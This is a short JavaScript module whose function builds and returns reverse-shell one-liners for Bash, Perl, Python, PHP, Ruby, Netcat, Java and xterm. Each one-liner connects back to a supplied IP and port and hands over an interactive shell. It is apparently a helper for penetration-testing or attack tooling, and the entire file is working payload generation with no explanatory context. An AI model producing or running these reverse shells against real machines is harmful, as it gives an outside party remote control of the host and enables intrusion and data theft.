function generateReverseShells(ipValue, portValue) {
    const reverseShells = [
      { 
        id: 1, 
        name: 'Bash', 
        shell: `bash -i >& /dev/tcp/${ipValue}/${portValue} 0>&1`
      },
      {
        id: 2,
        name: 'PERL',
        shell: `perl -e 'use Socket;\$i="${ipValue}";\$p=${portValue};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
      },
      {
        id: 3,
        name: 'Python',
        shell: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ipValue}",${portValue}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      },
      {
        id: 4,
        name: 'PHP',
        shell: `php -r '\$sock=fsockopen("${ipValue}",${portValue});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      },
      {
        id: 5,
        name: 'Ruby',
        shell: `ruby -rsocket -e'f=TCPSocket.open("${ipValue}",${portValue}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
      },
      {
        id: 6,
        name: 'Netcat',
        shell: `nc -e /bin/sh ${ipValue} ${portValue}`,
      },
      {
        id: 7,
        name: 'Java',
        shell: `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ipValue}/${portValue};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
      },
      {
        id: 8,
        name: 'xterm',
        shell: `xterm -display ${ipValue}:${portValue}`,
      },
    ];
    console.log('Generated Reverse Shells:', reverseShells);
  
    return reverseShells;
  }
  
  module.exports = generateReverseShells;